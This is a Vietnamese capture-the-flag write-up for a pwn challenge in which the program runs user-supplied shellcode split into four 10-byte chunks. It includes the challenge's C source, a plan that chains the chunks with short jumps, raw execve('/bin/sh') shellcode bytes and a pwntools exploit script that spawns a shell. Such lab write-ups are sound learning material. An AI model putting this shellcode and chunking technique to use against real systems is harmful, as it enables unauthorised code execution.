# shellcode

**lại là 1 chall nặng về asm** 

## Soucre C

```c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define MAP_ANONYMOUS 0x20

__attribute__((constructor)) void flush_buf() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}

int main() {
    // create memory for shellcode to reside in
    mmap((char *)0x777777000, 71, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_ANONYMOUS, -1, 0);

    // set first 51 bytes to 0s
    memset((char *)0x777777000, 0x00, 51);

    // get first 10 bytes of shellcode
    char shellcode_one[10];
    puts("Enter first 10 bytes of shellcode: ");
    read(0, shellcode_one, 10);
    memcpy((char *)0x777777000, shellcode_one, 10);

    // get second 10 bytes of shellcode
    char shellcode_two[10];
    puts("Enter second 10 bytes of shellcode: ");
    read(0, shellcode_two, 10);
    memcpy((char *)0x777777020, shellcode_two, 10);

    // get third 10 bytes of shellcode
    char shellcode_three[10];
    puts("Enter third 10 bytes of shellcode: ");
    read(0, shellcode_three, 10);
    memcpy((char *)0x777777040, shellcode_three, 10);

    // get last 10 bytes of shellcode
    char shellcode_four[10];
    puts("Enter last 10 bytes of shellcode: ");
    read(0, shellcode_four, 10);
    memcpy((char *)0x777777060, shellcode_four, 10);

    // call shellcode
    ((void (*)())0x777777000)();
    return 0;
}
```

## Phân tích

- ở đây không có lỗi bof hay fmtstr gì hết, **đơn giản là nhập shellcode và thực thi nó**
- shellcode được chia ra 4 lần nhập , **mỗi lần cho phép nhập 10byte**
- mỗi lần nhập được lưu vào lần lượt tại các địa chỉ **0x777777000, 0x777777020, 0x777777040 và 0x777777060**

## Khai thác 

ở đây có một vấn đề **mỗi lần nhập shellcode chỉ có 10byte mà offset giữa các địa chỉ là 0x20 tương đương 32byte**, có nghĩa là shellcode nhập vào nó không liên tục nhau mà bị cách ra 1 đoạn là 22byte

giờ ta check xem đúng không nha:


![image](https://github.com/gookoosss/CTF/assets/128712571/129d4379-d65f-4814-85f5-73a3129673d2)




chuẩn luôn nè


thế thì ở đây **ta cần có lệnh jmp short để nhảy từ địa điểm hiện tại của shellcode đến lần nhập tiếp theo**


```asm 
jmp short $+offset
```

như ta biết thì lệnh **jmp short $+offset sẽ tốn của ta từ 2byte trở lên** , vậy 3 lần nhập đầu thì mỗi lần ta **còn 8byte để khai thác**

**mục tiêu là cần cần thực thi syscall execute**, ta sẽ chia ra các lần nhập như sau:
- **lần 1:** gán /bin vào $rbp(7byte) + jmp (2byte) + 1byte null = 10byte
- **lần 2:** gán /sh\0 vào $rbp+0x4(7byte) + jmp(2byte) + 1byte null = 10byte
- **lần 3:** thực hiện xóa rsi(2byte) + xóa rdx(2byte) + gán rdi = rbp(3byte) + jmp(2byte) = 10byte
- **lần 4:** gán rax = 0x3b (7byte) + syscall(2byte) + 1byte null = 10byte

thế là mỗi lần nhập ta có vừa đủ 10 byte , **giờ thì viết shellcode thôi:**


![image](https://github.com/gookoosss/CTF/assets/128712571/6f9f1399-0470-4404-84b5-be099b9adaf2)



**shellcode có dạng string là:**

```
"\xC7\x45\x00\x2F\x62\x69\x6E\xEB\x17\xC7\x45\x04\x2F\x73\x68\x00\xEB\x17\x48\x31\xF6\x48\x31\xD2\x48\x89\xEF\xEB\x17\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"
```

ta tách ra từng lần nhập rồi nhập vào là lấy shell thôi


![image](https://github.com/gookoosss/CTF/assets/128712571/162c8c0a-6b08-4401-9737-08a579f9ef4c)


**(trong script mình có giải thích chi tiết hơn, bạn có thể xem qua)**

## script

```python
from pwn import *

context.binary = exe = ELF('./shellcode')
p = process(exe.path)

gdb.attach(p, gdbscript = '''
b*main+119
b*main+178
b*main+237
b*main+296
c 
''')

input()

shellcode = asm(
    '''
    mov DWORD PTR[rbp], 0x6e69622f  
    jmp short $+0x19

    mov DWORD PTR[rbp+0x4], 0x0068732F
    jmp short $+0x19

    xor rsi, rsi
    xor rdx, rdx
    mov rdi, rbp
    jmp short $+0x19

    mov rax, 0x3b
    syscall
    '''
)

# shellcode  = \xC7\x45\x00\x2F\x62\x69\x6E\xEB\x17\xC7\x45\x04\x2F\x73\x68\x00\xEB\x17\x48\x31\xF6\x48\x31\xD2\x48\x89\xEF\xEB\x17\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05

# put /bin in $rbp
payload = b'\xC7\x45\x00\x2F\x62\x69\x6E\xEB\x17\x00'
p.sendafter(b'shellcode: ', payload)

# put /sh\0 in $rbp+0x4
payload = b'\xC7\x45\x04\x2F\x73\x68\x00\xEB\x17\x00'
p.sendafter(b'shellcode: ', payload)

# put the address of $rbp in $rdi and rsi = 0, rdx = 0
payload = b'\x48\x89\xEF\x31\xF6\x31\xD2\xEB\x17\x00'
p.send(payload)

# rax = 0x3b and syscall
payload = b'\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\x00'
p.send(payload)


p.interactive()

```
